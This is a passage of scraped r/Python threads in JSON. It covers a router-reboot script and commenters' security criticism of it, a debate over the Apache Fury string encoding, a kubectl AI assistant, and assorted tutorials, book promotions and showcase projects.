            "content": "Good for you! Check out r/learnpython and if you're anywhere near Columbus, Ohio, USA, show up at PyOhio http://pyohio.org this July! Welcome to the team!"
        },
        {
            "author": "andrew_rosen",
            "score": "15",
            "content": "You've made a good choice. I'm using that textbook for my class this summer."
        },
        {
            "author": "bookroom77",
            "score": "55",
            "content": "Do check if the book is based on Python 3 syntax. Otherwise you will end up learning the wrong things and relearning stuff later on. Python 2 will be phased out in Jan 2020: https://pythonclock.org/"
        }
    ]
},
{
    "post_author": "HP7933",
    "post_id": "1cigewi",
    "post_score": "1",
    "post_time": "Thursday, May 2, 2024 at 5:00:09 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "The Python on Microcontrollers (and Raspberry Pi) Newsletter, a weekly news and project resource",
    "media": [
        "https://www.adafruitdaily.com/"
    ],
    "post_content": "The Python on Microcontrollers (and Raspberry Pi) Newsletter: subscribe for free\nWith the Python on Microcontrollers newsletter, you get all the latest information on Python running on hardware in one place! MicroPython, CircuitPython and Python on single Board Computers like Raspberry Pi & many more.\nThe Python on Microcontrollers newsletter is the place for the latest news. It arrives Monday morning with all the week’s happenings. No advertising, no spam, easy to unsubscribe.\n10,958 subscribers - the largest Python on hardware newsletter out there.\nCatch all the weekly news on Python for Microcontrollers with adafruitdaily.com.\nThis ad-free, spam-free weekly email is filled with CircuitPython, MicroPython, and Python information that you may have missed, all in one place!\nEnsure you catch the weekly Python on Hardware roundup– you can cancel anytime – try our spam-free newsletter today!\nhttps://www.adafruitdaily.com/",
    "comments": []
},
{
    "post_author": "SAV_NC",
    "post_id": "1ck452a",
    "post_score": "76",
    "post_time": "Saturday, May 4, 2024 at 7:22:50 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Reboot Your Router with a Python Script",
    "media": [
        "https://www.reddit.com/r/python/",
        "https://github.com/slyfox1186/script-repo/blob/main/Python3/reboot-router.py"
    ],
    "post_content": "Hello r/python,\nI've developed a Python script that allows you to reboot your router remotely via SSH! This script handles the countdown and checks when the router is back online after a reboot.\nWhat My Project Does:\nKey Features:\nAutomated Router Reboot: Remotely trigger a reboot of your router.\nMonitoring: After sending the reboot command, the script counts down from 350 seconds and starts checking the router's status by pinging it after the first 100 seconds have passed.\nFlexibility: You can pass arguments dynamically (router IP, username, password, and port) or use hardcoded values within the script.\nMethod of Execution: To execute the script from the command line:\npython3 reboot-router.py --ip <router_ip> --username <username> --password <password> --port <port_number>\nDefault values are set, but it's highly recommended to pass arguments to the script for security reasons.\nTarget Audience:\nThis script is intended for:\nTech Enthusiasts and Home Users who enjoy managing their home network setups and want a quick way to automate router management.\nRequirements:\nRequired Modules and Programs:\nPython 3: The script is written in Python 3. Ensure you have Python 3.6 or newer installed.\nsubprocess and argparse modules: These are standard libraries in Python and should be available with your Python installation.\nsshpass: This utility is used for noninteractive password authentication with SSH. Install it using your package manager, e.g., sudo apt-get install sshpass for Debian/Ubuntu.\nImportant Router Configuration:\nBefore using this script, make sure your router is configured to:\nEnable SSH Access: Ensure SSH is turned on and configured to accept password authentication. This setting is usually found under the Administration tab in your router settings.\nAllow ICMP Echo (Ping) Requests: Some routers disable ICMP Echo requests by default for security. You must enable Respond ICMP Echo (ping) Request from WAN under the Firewall tab.\nComparison:\nUnlike many GUI-based tools, this script provides a simple, lightweight command-line solution easily integrated into larger automation workflows or triggered manually without logging into the router interface.\nFor People New to Python:\nIf you're new to scripting or network management, be cautious about storing sensitive information like passwords directly in scripts. While hardcoded values can be used for ease and demonstration, the best practice is to pass these securely as arguments to prevent exposure.\nAccess to the script\nYou can access the script on my GitHub page here\nFeel free to use, modify, and share this script! I look forward to your feedback and enhancements!\nCheers -J",
    "comments": [
        {
            "author": "ThiefMaster",
            "score": "132",
            "content": "A few things I'd consider bad: The sudo/root stuff is simply pointless and a terrible idea as others pointed out. Password login on SSH should always be disabled, SSH keys exist for a reason Disabling hostkey checking is a bad idea. Make a manual connection once and then trust the host key, don't simply ignore invalid host keys. Sure, a MITM is extremely unlikely here, but it's a bad practice nonetheless. And then of course there's the question of why you need this to begin with. If my router sucked so much that it needs regular reboots, I'd probably get a different router...",
            "replies": [
                {
                    "author": "benefit_of_mrkite",
                    "score": "11",
                    "content": "I get that OP’s code is for home users but you could do this much more securely with paramiko (ssh protocol package), Netmiko (multivendor router/switch package), and/or ncclient (package for interacting with NETCONF clients)",
                    "replies": [
                        {
                            "author": "profkrowl",
                            "score": "5",
                            "content": "Even easier as a home user... Walk over and reboot the router. Sure, it can be a tad inconvenient at times, if it is upstairs or downstairs, but as infrequently as one should need to do it, that is my preferred method. Of course, as my home is single floor and the router is centralized, nit isn't that far to go most of the time. And if the access point in the shop goes down, it only matters to me if I'm in the shop and it is right there to fix. Suppose it could be a bit inconvenient to go in the house to reset the router for the shop, but it really isn't that far a walk.",
                            "replies": [
                                {
                                    "author": "benefit_of_mrkite",
                                    "score": "4",
                                    "content": "Im lazy. Im so lazy that i wrote code to turn my (home) office zone AC on with an IOT button on my desk. A desk that is maybe 2 feet away. My point is my laziness wouldn’t let me deal with a router that had to be rebooted at regular intervals. I would have probably slammed together some bash code until a new router came in. Personally I think this should have been a shell script for the OP’s own personal use. I’ve used Python to directly integrate with ssh without libraries and it is a pain - it is a pain when you’re dealing with the exact same (ssh server) hardware every time with the exact same auth method + key exchange protocol, etc. then you have to deal with device (router) terminal weirdness and more. There’s a reason paramiko exists."
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "AaronOpfer",
            "score": "47",
            "content": "You need sudo to make a network call, eh? How intriguing..."
        },
        {
            "author": "cpressland",
            "score": "22",
            "content": "DevOps / Network nerd here, if you need to frequently reboot your router, you likely have a firmware bug. Usually one relating to the NAT or ARP tables not being cleaned down. Replace the device. I have a router at a remote site with ~500 days of uptime, I don’t anticipate rebooting it any time soon (no patches are available right now).",
            "replies": [
                {
                    "author": "askvictor",
                    "score": "5",
                    "content": "Nice in theory, but in practice, if the vendor isn't pushing updates anymore, and you don't want to fork out $$ for new kit, a solution like this works fine."
                }
            ]
        },
        {
            "author": "GimmeShumGabagool",
            "score": "34",
            "content": "As someone who makes a living in cyber, I’d advise nobody use this. Under his “important router configuration” section, he tells you to enable ssh access, allow password authentication, and allow ICMP from WAN. Most folks don’t need to enable ssh on their router and if you do need to do so, there is no need to enable password authentication. Absolutely pointless risk. Enable ping from WAN - self explanatory useless risk. To the developer, if you want to do this yourself, whatever, but I’d recommend against it. But actually recommending this to others is harmful. You should probably remove this post. If you feel the need to keep it up then you should at least inform users of the risks they run by running this setup. EDIT: You say your target audience includes network admins. This would never be allowed in a corporate environment and no network admin would ever use this. There wouldn’t even be a need for this in a corporate environment but if there was, they’d be using Cisco equipment and use the Cisco IOS. This is something that a home user would use and most likely shouldn’t use due to not knowing the risks or how to manage them. This repo should just be set to private, dude."
        },
        {
            "author": "waterkip",
            "score": "47",
            "content": "I'm going to sound a bit harsh, but don't take it as such. You don't live up to the expecation of a target audience, network admins who value.. I mean, it is essentially a glorified shell script. You can do what you do in a couple of lines of bash/zsh: ssh $host /usr/sbin/reboot [ $? -ne 0 ] && echo \"Failed to reboot $host\" >&2 && exit 1 while : ; do ping -n -w 2  -c 4 $host && break echo \"Did not hear back from $host yet.. \" sleep 2 done Your script falls flat for various reasons: Like I said, a shell script can do what you do here. You use shell utilities, which I guess is fine, but if you are going to use python, use python modules to ping and ssh to a host. Think modules such as pythonping, paramiko and/or ssh-python. If you are going to use the shell utilities, make sure you respect their configuration. Eg, ssh has .ssh/config where I can set my username, port etc configuration for hosts. Use them, when the default port of 22 is used, don't override it with your default 22 because it breaks my .ssh/config default. When there isn't a username, don't insert your default, my default is the username of the current user, so use the shell environment $USER.. Although rather, don't set it at all, ssh is smart enough."
        },
        {
            "author": "RetardedChimpanzee",
            "score": "11",
            "content": "A $10 smart plug (with built in timer functionality) would be a lot quicker and more secure."
        },
        {
            "author": "askvictor",
            "score": "4",
            "content": "Here's one I hacked together that just uses the http interface; this was for a netgear orbi pro. import requests import re RETRIES = 3 BASE_ADDRESS = 'https://192.168.1.1' AUTH=('username', 'password') for i in range(RETRIES): r=requests.get(f'{BASE_ADDRESS}/reboot.htm', auth=AUTH, verify=False) if r.status_code == 200: ts = re.search(r'timestamp=\\d+', r.text).group() break else: exit(1) for i in range(RETRIES): p=requests.post(f'{BASE_ADDRESS}/apply.cgi?/reboot_waiting.htm {ts}', auth=AUTH, verify=False, data={'submit_flag':'reboot', 'yes':'Yes'}) if r.status_code == 200: exit(0) else: exit(1)"
        }
    ]
},
{
    "post_author": "jgloewen",
    "post_id": "1cj57lw",
    "post_score": "49",
    "post_time": "Friday, May 3, 2024 at 1:22:19 PM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "Project: Simple Interactive Python Streamlit Maps With NASA GIS Data",
    "media": [
        "https://johnloewen.substack.com/p/simple-interactive-python-streamlit"
    ],
    "post_content": "Python Streamlit is terrific for putting together interactive dashboards.\nCombined with the geopandas library, streamlit can easily display GIS data points on a map for you.\nForest fires in my home province of British Columbia, Canada have been really bad recently. NASA has a terrific dataset that keeps track of forest fires by country.\nCan I use Streamlit to access this dataset and display a map off all the fires within a certain area (BC) for a particular time frame (2021)?\nAnd can I give the user the ability to choose a month?\nYou bet! Let me step you through how!\nFREE tutorial (with code):\nhttps://johnloewen.substack.com/p/simple-interactive-python-streamlit",
    "comments": [
        {
            "author": "bad4teverything",
            "score": "4",
            "content": "This is cool.",
            "replies": [
                {
                    "author": "jgloewen",
                    "score": "4",
                    "content": "Thanks so much! It was so much fun to put this project together. Give it a go!"
                }
            ]
        },
        {
            "author": "DigThatData",
            "score": "3",
            "content": "now figure out how to embed that interactive map in your blog ;)",
            "replies": [
                {
                    "author": "jgloewen",
                    "score": "1",
                    "content": "Yes, that's a great next step. I used to host all my own stuff so it would have been easy. A bit more difficult on Substack. Suggestions? And thx for the comment - much appreciated :-)"
                }
            ]
        }
    ]
},
{
    "post_author": "__boba__",
    "post_id": "1chtmle",
    "post_score": "21",
    "post_time": "Wednesday, May 1, 2024 at 9:37:41 PM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "How to auto-instrument Python servers w/ OpenTelemetry for performance & error monitoring",
    "media": [
        "https://www.hyperdx.io/blog/opentelemetry-python-server-auto-instrumentation"
    ],
    "post_content": "Hi everyone! We've recently written up a guide for anyone running a Python server (ex. Flask, Django, FastAPI) to instrument their app to debug slow downs and errors using the CNCF OpenTelemetry project and their Python instrumentation package.\nIt's really straightforward to get started with just a few lines of added code and commands to any Python project, so hopefully helps some people out as they're looking to add better instrumentation to their servers.\nHere's the tutorial: https://www.hyperdx.io/blog/opentelemetry-python-server-auto-instrumentation",
    "comments": []
},
{
    "post_author": "[deleted]",
    "post_id": "c0xcn6",
    "post_score": "2127",
    "post_time": "Saturday, June 15, 2019 at 4:35:24 PM GMT+3",
    "flair_text": "",
    "post_title": "Probably the most useless thing that I have ever coded but it’s fun looking at it",
    "media": [
        "https://external-preview.redd.it/jZJVCwWfxdbC5TYGDRC0LdZTVfCD7XF181jYiNa1K9U.png?width=640&crop=smart&format=pjpg&auto=webp&s=e759539bf8d75f6254db5754fc6a85aaa0f257af"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "EnragedMahmut",
            "score": "252",
            "content": "Man what an awesome application you wrote there. This made me smile. Thanks",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "99",
                    "content": "If that’s what makes you smile I got much more to show ya lol 😄",
                    "replies": [
                        {
                            "author": "ForkLiftBoi",
                            "score": "35",
                            "content": "Do it",
                            "replies": [
                                {
                                    "author": "buffalo_biff",
                                    "score": "55",
                                    "content": "it’s his dick. Fork, he’s going to show you his dick"
                                }
                            ]
                        },
                        {
                            "author": "crvc",
                            "score": "16",
                            "content": "if it makes someone smile it's not useless :)"
                        },
                        {
                            "author": "Iggyhopper",
                            "score": "4",
                            "content": "KERCHEW"
                        }
                    ]
                }
            ]
        },
        {
            "author": "porongtong",
            "score": "42",
            "content": "KA-CHOW!"
        },
        {
            "author": "[deleted]",
            "score": "83",
            "content": "https://github.com/PizzaBoii/kachoww/blob/master/work.py for those who asked for the code, it is kinda messy and people that like PEP 8 are probably going to kill me for that xD but ehhh that's the code Also not sure who gave me the gold but Thanks a lot :D I’ve never got something that good before :)",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "38",
                    "content": "\"while not crashed:\" I like it."
                }
            ]
        }
    ]
},
{
    "post_author": "Samausi",
    "post_id": "1cknhb0",
    "post_score": "3",
    "post_time": "Sunday, May 5, 2024 at 12:32:41 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Opinions sought: Modernising the Apache NiFi Python client",
    "media": [
        "https://github.com/Chaffelson/nipyapi",
        "https://www.reddit.com/r/Python/",
        "https://www.buildwithfern.com/",
        "https://nifi.apache.org/",
        "https://github.com/Chaffelson/nipyapi/blob/main/resources/client_gen/generate_api_client.sh"
    ],
    "post_content": "Hello folks, I am the author of NiPyAPI, the defacto Python client for the Apache NiFi project.\nFor those unfamiliar, Apache NiFi is an open-source ETL tool designed around the flow-based programming paradigm. It excels at continuously moving and managing arbitrary data flows between disparate systems with low latency at large scale, and is often contrasted with Airflow.\nAmongst many features, NiFi allows for Command & Control via a native UI, enabling live edits to data routing and transformation. NiFi also enforces an API-first approach, and produces a swagger definition during code compilation, which allowed creation of a Python client to enable automated Data Flow testing and a Design & Deploy approach by running it through Swagger Codegen 2.3 tool shaped by mustache templates. This produces a very verbose low-level client, which I then leverage in higher-level operational functions and demo scripts in the library.\nHowever it's always bugged me that this produces literally 10's of thousands of lines of boilerplate, so potentially replacing the low level client with something more modern would ideally massively reduce the codebase without impacting the high-level functionality of the library.\nNow, I first started it mid last decade with Python2 for broad compatibility and times have moved on significantly (as has my skill with Python) but it's finally time to drop Python2 support and move to a better build & release process, which opens the door to a larger update, and I am frankly not across modern best-practices around ClientGen so I come seeking r/Python's advice: How would you modernise this venerable artefact?\nI could simply move to a newer version of Swagger Codegen, or move into the OpenAPI Generator, I could get fancy with something like Fern - or I could leave well enough alone and just accept that the tons of boilerplate are at least very readable.",
    "comments": []
},
{
    "post_author": "AutoModerator",
    "post_id": "1cjmysm",
    "post_score": "3",
    "post_time": "Saturday, May 4, 2024 at 3:00:12 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Saturday Daily Thread: Resource Request and Sharing! Daily Thread",
    "media": [],
    "post_content": "Daily Thread",
    "comments": []
},
{
    "post_author": "Shawn-Yang25",
    "post_id": "1cmcy3y",
    "post_score": "82",
    "post_time": "Tuesday, May 7, 2024 at 5:15:07 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Rethinking String Encoding: a 37.5% space efficient string encoding than UTF-8 in Apache Fury",
    "media": [
        "https://github.com/apache/incubator-fury/blob/main/docs/specification/xlang_serialization_spec.md#meta-string",
        "https://fury.apache.org/blog/fury_meta_string_37_5_percent_space_efficient_encoding_than_utf8"
    ],
    "post_content": "In rpc/serialization systems, we often need to send namespace/path/filename/fieldName/packageName/moduleName/className/enumValue string between processes.\nThose strings are mostly ascii strings. In order to transfer between processes, we encode such strings using utf-8 encodings. Such encoding will take one byte for every char, which is not space efficient actually.\nIf we take a deeper look, we will found that most chars are lowercase chars, ., $ and _, which can be expressed in a much smaller range 0~32. But one byte can represent range 0~255, the significant bits are wasted, and this cost is not ignorable. In a dynamic serialization framework, such meta will take considerable cost compared to actual data.\nSo we proposed a new string encoding which we called meta string encoding in Fury. It will encode most chars using 5 bits instead of 8 bits in utf-8 encoding, which can bring 37.5% space cost savings compared to utf-8 encoding.\nFor string can't be represented by 5 bits, we also proposed encoding using 6 bits which can bring 25% space cost savings\nMore details can be found in: https://fury.apache.org/blog/fury_meta_string_37_5_percent_space_efficient_encoding_than_utf8 and https://github.com/apache/incubator-fury/blob/main/docs/specification/xlang_serialization_spec.md#meta-string",
    "comments": [
        {
            "author": "Oerthling",
            "score": "65",
            "content": "\"this cost is not ignorable\" - err, what? Debatable.How long are such names now? 10? 30? 50 characters? So we save 3, 10, 16 bytes or so? Examples from the article: 30 -> 19 11 -> 9 Sorry. But I don't see the value. There's plenty situations where this should be easily ignorable. Especially if this comes at extra complexity, reduced debugability, extra/unusual processing. UTF8 is great. It saves a lot of otherwise unneeded bytes and for very many simple cases is indistinguishable from ASCII. Which means that every debugger/editor on this planet make at least parts of the string immediately recognizable, just because almost everything can at least display as ASCii. Great fallback. For small strings paying with extra complexity and processing for saving a few bytes and the getting something unusual/non- standard doesn't sound worthwhile to me. And for larger text blobs where the savings start to matter (KB to MB), I would just zip the big text for transfer.",
            "replies": [
                {
                    "author": "Shawn-Yang25",
                    "score": "17",
                    "content": "The meta string here are used in binary serialization format internally. It's not about encoding general text. This is why we name it as meta string. For general string encoding, utf8 are always better. If you take pickle as an example, you will found it write many string such as module name, class name into the binary data. It's such data we want to reduce cost.  And in data classes, field names may take considerable cost If the value are just a number",
                    "replies": [
                        {
                            "author": "pigeon768",
                            "score": "26",
                            "content": "There are three situations: The string is small. In this case, the cost of serializing/deserializing the string is greater than the cost of copying the extra handful of bytes. In this case, you should not use this string encoding. The string is medium. In this case, you need to show that meta string is better than either raw strings or zstd encoded strings. The string is large. In this case, zstd will be better. In this case, you should not use this string encoding. Basically you need to prove it to me. I want to see this benchmark: Encoding Small Medium Large utf8 zstd meta string I want end to end speed/throughput, not number of bytes saved.",
                            "replies": [
                                {
                                    "author": "Oerthling",
                                    "score": "6",
                                    "content": "Exactly. I'm looking for a use-case where getting an obscured string with extra processing leads to a saving anyone can care about."
                                },
                                {
                                    "author": "Shawn-Yang25",
                                    "score": "1",
                                    "content": "All strings use this encoding will cache the encoded results, and the serialization will be just an copy. Since such strings are limited, we won't have millions of module/classname for serialization. So it's ok to cache the encoded result"
                                }
                            ]
                        },
                        {
                            "author": "Oerthling",
                            "score": "9",
                            "content": "Sure, but even if I debug binary data, being able to easily recognize string characters is very helpful. Saving 30% on strings of length 100 or less doesn't look worthwhile to me. Under what circumstances would I be worried about a few bytes more or less? Say, I pickle a module and the contained strings using a total of 1000 bytes and now it's 700 bytes instead. Saving those 300 bytes - how would I ever notice that?",
                            "replies": [
                                {
                                    "author": "Shawn-Yang25",
                                    "score": "7",
                                    "content": "In many case, the payload size is not important. UTF-8 will better for binary debug. But there do have cases we need smaller size, in such cases 30% gains may be worthwile. But we may should provide a switch to to allow users disable such optimization."
                                },
                                {
                                    "author": "ProgrammersAreSexy",
                                    "score": "5",
                                    "content": "It really depends on the scale you are talking about. If you are running a service that handles millions of QPS 24/7 then seemingly small optimizations like this can translate into 6 or 7 figure savings over time."
                                },
                                {
                                    "author": "anentropic",
                                    "score": "3",
                                    "content": "what if you are serializing millions of db rows?"
                                },
                                {
                                    "author": "GuyOnTheInterweb",
                                    "score": "1",
                                    "content": "Perhaps in a 1500 MTU network package?"
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "Quiet_Possible4100",
            "score": "21",
            "content": "Lmao, please do a benchmark comparing this and just Unicode and tell us how many ms and kb RAM you saved. This is such a specific microoptimization that there’s probably 100 things you can do before this is worth it"
        },
        {
            "author": "unkz",
            "score": "11",
            "content": "A more efficient means of doing this, if you absolutely must (and you don't), would be static Huffman, which this kinda is, but not quite."
        },
        {
            "author": "yvrelna",
            "score": "13",
            "content": "I don't think the advantage of this string encoding is really worthwhile over just compressing the data. Most general purpose compression algorithms can take advantage of data with limited character sets. For example, this: >>> data = \"\".join(random.choices(string.ascii_lowercase + \".$_\", k=1000000)) >>> len(data) 1000000 >>> print(len(bz2.compress(data.encode()))) 616403 That's about 38% compression rate which is a compression rate that's in similar ballpark as the proposed 5-bit string encoding. lzma and gzip can do something similar as well. This is on a random data, so the 38% compression rate is the lower bound; the compression rate would be even better for non random texts that usually has other exploitable patterns. Moreover, a general purpose compressor will be able to adapt to other arbitrarily restricted character sets, and take advantage of other patterns in the data, like JSON key names, or namespace/paths that keeps being repeated in multiple places. They're a more reliable way to compress than just using a custom encoding. For RPC/APIs serialisation where there's often repeated key names, you can do even better compression rates if using preshared dictionary compression like brotli or zstd or using data format with preshared schema like protobuf."
        },
        {
            "author": "rmjss",
            "score": "9",
            "content": "“Such encoding will take one byte for every char…” this is not accurate. See the first sentence from Wikipedia’s UTF-8 article for details"
        },
        {
            "author": "ObjectivismForMe",
            "score": "4",
            "content": "Look at this: https://pypi.org/project/protobuf/"
        },
        {
            "author": "RonnyPfannschmidt",
            "score": "3",
            "content": "How does this compare to making a array and replacing names with indexes? Like just dedup"
        },
        {
            "author": "nostrademons",
            "score": "3",
            "content": "You are almost always better off encoding with UTF-8 and then gzipping. A string encoding format's primary virtue is portability: the most important thing is that other systems understand you, not how compact you can make it. UTF-8 is reasonably compact, but the real reason it's used is because it's a superset of ASCII, so all the old code that handles ASCII strings does not need to be retooled. GZip is a lossless compression format. It has been very tightly engineered to operate on the efficient frontier between space savings and fast decoding, and modern implementations can trade off between them. It's also a well-known standard with hundreds of tools that can handle it. When you have namespace/path/filename/fieldName/etc strings, they are frequently repeated, and they frequently draw from a very small lexicon. You can do way better than 5 bits per character for this; you can often get away with less than 1 bit amortized per character, because the whole token can be encoded in just a few bits. GZip regularly achieves 80-90% compression on code."
        },
        {
            "author": "FailedPlansOfMars",
            "score": "5",
            "content": "It seems that applying compression would save you more space without creating a new string standard. As someone who remembers the latin 1 code page and other non standard 8851 code pages please dont leave utf8 as you introduce translitteration back into the world."
        }
    ]
},
{
    "post_author": "ManningBooks",
    "post_id": "1cj8zp2",
    "post_score": "10",
    "post_time": "Friday, May 3, 2024 at 4:42:21 PM GMT+3",
    "flair_text": "News",
    "post_title": "New book! The Quick Python Book, Fourth Edition by Naomi Ceder",
    "media": [
        "https://shortener.manning.com/aEQj",
        "https://shortener.manning.com/gvee"
    ],
    "post_content": "Hello everybody,\nThank you for having us here, and a huge \"Thank you\" to the moderators for letting us post.\nWe have just released the latest edition of The Quick Python Book by the one-and-only Naomi Ceder, and I wanted to share that news with the community.\nMany of you are already familiar with Naomi's work and her massive contributions to the world of Python programming language.\nThe Quick Python Book has aided over 100,000 developers in mastering Python. The Fourth Edition of the book has been revised to include the latest features, control structures, and libraries of Python, along with new coverage of working with AI-generated Python code. Naomi, the author, has beautifully balanced the details of the language with the insights and advice required to accomplish any task. Her personal touch has made learning Python an enjoyable experience for countless developers.\n📚 You can find the book here: https://mng.bz/aEQj\n📖 Get into the liveBook: https://mng.bz/gvee\nAnd last but not the least, get 46% off with code: receder46\nHope you find the book helpful.\nThank you.\nCheers,",
    "comments": []
},
{
    "post_author": "Wild_Plantain528",
    "post_id": "1cij4mp",
    "post_score": "0",
    "post_time": "Thursday, May 2, 2024 at 6:52:38 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "k8sAI - my open-source GPT CLI tool for Kubernetes!",
    "media": [
        "https://github.com/wilson090/k8sAI"
    ],
    "post_content": "What my project does:\nI wanted to share an open-source project I’ve been working on called k8sAI. It’s a personal AI Kubernetes expert that can answer questions about your cluster, suggests commands, and even executes relevant kubectl commands to help diagnose and suggest fixes to your cluster, all in the CLI!\nTarget Audience:\nAs a relative newcomer to k8s, this tool has really streamlined my workflow. I can ask questions about my cluster, k8sAI will run kubectl commands to gather info, and then answer those question. It’s also found several issues in my cluster for me - all I’ve had to do is point it in the right direction. I’ve really enjoyed making and using this so I thought it could be useful for others. Added bonus is that you don’t need to copy and paste into ChatGPT anymore!\nk8sAI operates with read-only kubectl commands to make sure your cluster stays safe.\nAll you need is an OpenAI API key and a valid kubectl config. Start chatting with k8sAI using:\n$ pip install k8sAI\n$ k8sAI chat\nor to fix an issue:\n$ k8sAI fix -p=\"take a look at the failing pod in the test namespace\"\nWould love to get any feedback you guys have!\nHere's the repo for anyone who wants to take a look\nComparison:\nI found a tool (k8sGPT) that I enjoyed using, but I felt it was still missing a few pieces on the chatbot side. You can't chat back and forth with k8sGPT and it doesn't suggest commands for you to execute, so I decided to make this.",
    "comments": [
        {
            "author": "riklaunim",
            "score": "13",
            "content": "This sounds somewhat dangerous to let AI model execute commands on the cluster? And if you are managing a cluster and you don't know what is going on to a point that ChatGPT has to quote some docs for you is also... questionable.",
            "replies": [
                {
                    "author": "Wild_Plantain528",
                    "score": "2",
                    "content": "I've added a step before the LLM can execute the command where you can explicitly approve or deny them to make it safe"
                },
                {
                    "author": "Wild_Plantain528",
                    "score": "1",
                    "content": "Someone in r/kubernetes suggested using a read-only conf for kubectl for any GPT executions, so I’m gonna implement that next"
                }
            ]
        },
        {
            "author": "nevotheless",
            "score": "1",
            "content": "You atleast need to add something that makes it more transparent what it would do to the cluster if it hast non read-only access. Otherwise it’s way too dangerous to use. Add an explainer part to the output or something. Think of what GitHub Copilot workspaces will do: Specification Phase (this is the prompt) Planning Phase (this is missing from your tool) Execution Phase (Runs the proposed and eventually adjusted plan)",
            "replies": [
                {
                    "author": "Wild_Plantain528",
                    "score": "2",
                    "content": "I updated the flow so that the user has to explicitly approve or deny any command run, so that way there’s now manual verification"
                }
            ]
        }
    ]
},
{
    "post_author": "RJW-20",
    "post_id": "1cm8s6f",
    "post_score": "30",
    "post_time": "Tuesday, May 7, 2024 at 1:38:17 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Python script to convert Spotify Artists to Playlists",
    "media": [
        "https://github.com/RJW20/spotify-artist-to-playlist"
    ],
    "post_content": "I've made my first bit of useful software and I wanted to share it here. I'd love some feedback (and it would be amazing to hear if someone has used it!)\nWhat My Project Does:\nUsing the third party requests package, the script interacts with the Spotify web API to request all albums from the given Artist, then all the tracks from all of those albums. It then goes through the list to remove any duplicates and also tries to remove any unwanted versions (only done by examining the name of the track, since Spotify does not attribute a version type to its tracks). Once that's done a playlist is then created on your Spotify account with the name of the Artist and all the tracks are posted there in chronological (essentially per album) order.\nTarget Audience:\nAnyone who struggles like me when they find a new Artist and they want to listen to every conceivable song from them!\nLink to GitHub: https://github.com/RJW20/spotify-artist-to-playlist",
    "comments": [
        {
            "author": "ElderberryPrevious45",
            "score": "6",
            "content": "Nice to remember Spotify has a general purpose API, there might be other use for it too!"
        },
        {
            "author": "Puzzleheaded_Bill271",
            "score": "6",
            "content": "Good project, keep it up! Hope you're proud of it :) Constructive feedback: Look into itertools.batched for iterating through your urls to post to the playlist. General python advice: In general if you can do things with a for loop, dont use a while loop. It usually makes things easier to understand. The duplicate removal can probably be written more readably using sets, which are inherently deduplicated. Some tests would be great. If there were tests I would have played around getting the deduplication function using sets. I like to use pytest, and you can easily mock requests. Argparse wouldn't go amiss either, rather than having to manually edit the settings file when you want to run it. Good stuff :)",
            "replies": [
                {
                    "author": "RJW-20",
                    "score": "2",
                    "content": "Thank you for the feedback! I've switched to itertools.batched, thanks for the recommendation. Testing has always been something I've said I'll do but never really got around to learning how to do it, so I'll use this as an excuse to do so and then I'll rewrite the duplicate removal more clearly with the aid of the tests to make sure it still functions correctly :)"
                }
            ]
        },
        {
            "author": "ProZMenace",
            "score": "1",
            "content": "Decently knew to creating larger scale projects and was wondering if this is common practice to separate all of your methods by the area you want to use them in then combine all of it in a main file? Typically I've established all classes and methods at the top and written everything in one main file. Thanks!"
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1ci1f9v",
    "post_score": "6",
    "post_time": "Thursday, May 2, 2024 at 3:00:08 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Thursday Daily Thread: Python Careers, Courses, and Furthering Education!",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "Friendly_Fire_HD2",
            "score": "1",
            "content": "What would be a good starter recommendation when it comes to getting into Python? I work in Metrology Polyworks, and slowly stumbling into macros and commands, I know it's not 1 to 1, but learning some basic python could help me better understand the programming within Polyworks from my understanding and maybe future things from there. So just curious what you would recommend in your free time to get an overall grasps of the basics. TIA."
        },
        {
            "author": "Super-King9449",
            "score": "1",
            "content": "Do we have any certifications available free?"
        }
    ]
},
{
    "post_author": "Enguzelharf",
    "post_id": "empp5x",
    "post_score": "2110",
    "post_time": "Friday, January 10, 2020 at 2:26:57 PM GMT+3",
    "flair_text": "",
    "post_title": "[OC] Updated version of my recent maze finding algorithm with source code",
    "media": [
        "https://external-preview.redd.it/skLAb9i8rtzrciuI7S0X830nFfR46FdjK3L0OHU6vv8.png?width=640&crop=smart&format=pjpg&auto=webp&s=0640d93b13c62d46c669c00f82290fed79290dac"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "rafaelmarques7",
            "score": "273",
            "content": "This is a beautiful visualization. I especially like the yellow spots marking alternative paths.",
            "replies": [
                {
                    "author": "hughperman",
                    "score": "69",
                    "content": "I thought it would be even nicer if it marked the explored dead-end paths in some way",
                    "replies": [
                        {
                            "author": "wsppan",
                            "score": "34",
                            "content": "Mark them in the same color as the walls of the maze (red/maroon?) So they disappear as you explore them leaving the one true path and the unexplored ones."
                        },
                        {
                            "author": "jjdmol",
                            "score": "12",
                            "content": "Haven't looked at the code but it should be easy.. just clear the explored paths with something else than black (or red/orange/green, obv). The dead ends are never visited again so there's no risk of the algorithm screwing up."
                        }
                    ]
                }
            ]
        },
        {
            "author": "Enguzelharf",
            "score": "53",
            "content": "I also have a question: Can i idle this python script on a server using my github student account privileges freely on cloud or something else then get the png files with a scp or something. Basically i want free computing power and storage(around 1gig)? Source With command line arguments python path.py file.txt W=Wall P=path S=Start F=Finish NxM txt file will work fine also here some example mazes. Files Algorithm finds the correct path by going into every possible path and flags the cells where it can go other directions as well. Used numpy and matplotlib numpy to keep track of the maze and matlpotlib.pcolor() to visualize and then last touches with Adobe After effects https://en.wikipedia.org/wiki/Depth-first_search https://en.wikipedia.org/wiki/Maze_solving_algorithm"
        },
        {
            "author": "RPDiep",
            "score": "91",
            "content": "a maze ing (I'll let myself out now)"
        },
        {
